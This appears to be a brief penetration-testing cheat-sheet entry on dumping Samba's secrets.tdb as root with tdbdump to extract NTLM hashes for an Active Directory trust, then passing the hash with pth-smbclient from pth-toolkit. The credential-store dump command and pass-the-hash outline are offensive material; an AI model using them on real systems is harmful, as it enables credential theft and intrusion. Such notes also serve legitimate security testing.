```bash
# Assuming root access on Linux
tdbdump /var/lib/samba/private/secrets.tdb

# Assuming target hash trust with Active Directory, decode UTF-8 encoded "data" to get NTLM hashes

# Use pth-smbclient, from pth-toolkit, to pass-the-hash.
```

# References
[pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)